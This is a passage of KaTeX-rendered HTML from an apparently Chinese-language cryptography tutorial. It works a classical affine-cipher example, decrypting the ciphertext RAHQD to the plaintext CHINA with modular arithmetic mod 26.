class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">7</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">6</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">A</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>对应密文消息为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>A</mi><mi>H</mi><mi>Q</mi><mi>D</mi></mrow><annotation encoding="application/x-tex">RAHQD</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">Q</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span></p><p>解密：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>c</mi><mo stretchy="false">)</mo><mo>=</mo><mn>15</mn><mo>×</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>17</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>16</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>−</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>19</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>19</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>19</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>19</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>19</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>236</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>19</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>86</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>221</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>26</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>13</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>C</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>H</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>I</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>N</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>A</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">D_{k}(c)=15 \times\left[\begin{array}{c}17 \\0 \\7 \\16 \\3\end{array}\right]-\left[\begin{array}{c}19 \\19 \\19 \\19 \\19\end{array}\right]=\left[\begin{array}{c}236 \\-19 \\86 \\221 \\26\end{array}\right] \bmod 26=\left[\begin{array}{c}2 \\7 \\8 \\13 \\0\end{array}\right]=\left[\begin{array}{c}C \\H \\I \\N \\A\end{array}\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">7</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">6</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">9</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">9</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">9</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">9</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">9</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord">3</span><span class="mord">6</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span><span class="mord">9</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span><span class="mord">6</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord">2</span><span class="mord">1</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2500000000000004em;"><span style="top:-5.410000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span><span style="top:-1.8099999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">3</span></span></span><span style="top:-0.6099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.7500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.9879800000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.0139700000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.25499em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.75004em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:6.00503em;vertical-align:-2.75004em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.2549900000000003em;"><span style="top:-1.0499800000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.1999800000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.79598em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.39198em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.9879800000000003em;"><span 